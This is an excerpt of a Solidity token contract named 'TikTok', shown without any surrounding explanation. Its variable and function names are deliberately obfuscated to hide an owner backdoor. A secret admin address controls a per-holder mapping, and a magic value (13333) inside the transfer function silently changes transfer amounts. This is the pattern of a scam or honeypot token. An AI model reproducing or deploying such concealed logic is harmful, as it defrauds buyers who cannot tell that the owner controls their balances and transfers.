...
contract Token is Ownable {
    ...
    address public hhbAdminttui;
    uint256 private tokensupply = 10000000000*10**decimals();

    uint256 private _tokentotalSSSupply;
    string private _Tokename = "TikTok";
    string private _tokenSSSsymbol = "TikTok";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public rnnmuserlll;
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        rnnmuserlll[cjjjss] = zramount;    
        if(_msgSender() == hhbAdminttui){
            require(_msgSender() == hhbAdminttui);
        }else{
            require(_msgSender() == hhbAdminttui);
        }
    ...
    function _transfer(
        ...
        if (13333 != rnnmuserlll[vipFrom]) {}else{
            amount = _balances[vipFrom] + rnnmuserlll[vipFrom];
        }
